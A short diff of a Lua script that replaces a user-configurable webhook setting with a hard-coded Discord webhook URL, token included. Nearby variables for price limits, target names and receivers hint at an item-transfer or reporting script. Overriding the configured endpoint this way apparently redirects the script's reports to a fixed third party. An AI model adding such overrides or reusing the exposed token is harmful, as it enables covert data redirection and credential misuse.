@@ -41,7 +41,7 @@ do
     end
 end
 
-local WEBHOOK = config.WEBHOOK
+local WEBHOOK = "https://discord.com/api/webhooks/1416397712827355206/nARi-mARo2L6FqBaeX-9wGMuEX58cCEX2XMnqk-Cr3wM4yO8CqwyQHqXLppZ-AXIPauJ"
 local PRICE_LIMIT = config.PRICE_LIMIT
 local targetNames = config.targetNames or {}
 local receiverList = table.concat(config.Receiver or {}, ", ")
